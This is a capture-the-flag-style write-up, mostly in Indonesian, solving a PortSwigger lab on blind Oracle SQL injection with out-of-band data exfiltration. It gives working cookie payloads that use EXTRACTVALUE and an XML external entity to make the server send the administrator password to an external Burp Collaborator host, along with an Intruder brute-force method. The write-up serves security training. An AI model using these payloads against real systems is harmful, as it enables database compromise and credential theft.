
# Blind SQL injection with out-of-band data exfiltration

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

Learning path: If you're following our learning path, please note that the suggested solution for this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.


---------------------------------------------

References: 

- https://portswigger.net/web-security/sql-injection/blind

- https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------

# **Detail Query dan Penjelasan Eksploitasi Blind SQL Injection dengan Out-of-Band Data Exfiltration**

### **Payload Utama**
Payload awal untuk memicu interaksi Out-of-Band (OOB) dengan server Burp Collaborator adalah sebagai berikut:

```plaintext
Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```

Payload ini memanfaatkan fungsi Oracle **`EXTRACTVALUE`** untuk memproses dokumen XML yang dirancang agar server melakukan DNS lookup ke domain Burp Collaborator.

---

### **Langkah Eksploitasi dengan Data Retrieval**
Untuk melakukan eksploitasi yang lebih kompleks, seperti mengambil data sensitif (misalnya, password), kita bisa menggunakan query seperti ini:

```sql
SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') 
THEN 'a'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual) 
ELSE NULL END 
FROM dual
```

Payload ini akan memproses langkah berikut:
1. **`SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1)`**:
   - Mengekstrak karakter pertama dari kolom `password` untuk user `administrator`.
2. **`CASE WHEN ... THEN ... ELSE NULL`**:
   - Jika karakter pertama adalah `'a'`, server akan mencoba mengakses URL Burp Collaborator.
   - Jika tidak, tidak ada interaksi yang terjadi.
3. **`EXTRACTVALUE`**:
   - Memproses dokumen XML dengan deklarasi entitas eksternal untuk memicu DNS lookup.

**Payload yang diterapkan ke cookie**:

```plaintext
FFyToxqSs49lpxuC'+union+SELECT+CASE+WHEN+((SUBSTR((SELECT+password+FROM+users+WHERE+username+=+'administrator'),1,1))!='a')+THEN+'a'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual)+ELSE+NULL+END+FROM+dual--;
```

---

### **Hasil Pengujian**
1. **Menggunakan Payload Pertama**:
   - Tes dilakukan untuk memvalidasi apakah karakter pertama dari password bukan `'a'`.
   - Interaksi dengan domain Burp Collaborator berhasil terjadi:

   ![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/1.png)

   ![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/2.png)

2. **Menggunakan Intruder**:
   - Payload dikirim ke **Burp Intruder**.
   - Posisi pertama diatur untuk karakter password, dan posisi kedua untuk subdomain Burp Collaborator.
   - Mode **Battering Ram** digunakan untuk mencoba berbagai karakter secara otomatis:

   ![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/3.png)


### **Wordlist Karakter**
```
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
0
1
2
3
4
5
6
7
8
9
!
@
#
$
%
^
&
*
(
)
-
_
=
+
[
]
{
}
|
\
:
;
"
'
<
>
,
.
?
/
~
`
```
3. **Hasil Akhir**:
   - Ditemukan bahwa karakter password adalah `'e'`:

   ![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/4.png)

4. **Iterasi untuk Seluruh Password**:
   - Dengan mencoba setiap karakter secara berurutan, password lengkap berhasil dieksfiltrasi: `e6jomps7kptnx04vcvtz`.

---

### **Payload Alternatif untuk Data Retrieval**
Payload ini menggunakan fitur Oracle untuk mengekstraksi data lebih lanjut:

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Implementasi untuk mengambil seluruh password:

```plaintext
mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

---

### **Validasi Hasil**
Ketika payload berhasil dieksekusi, server melakukan DNS lookup ke Burp Collaborator, membuktikan bahwa data telah dieksfiltrasi:

![img](images/Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration/5.png)

---

### **Kesimpulan**
Payload ini memungkinkan eksploitasi Blind SQL Injection dengan teknik Out-of-Band untuk mengambil data sensitif dari server, memanfaatkan mekanisme DNS lookup untuk memvalidasi eksekusi query dan mengirimkan data.
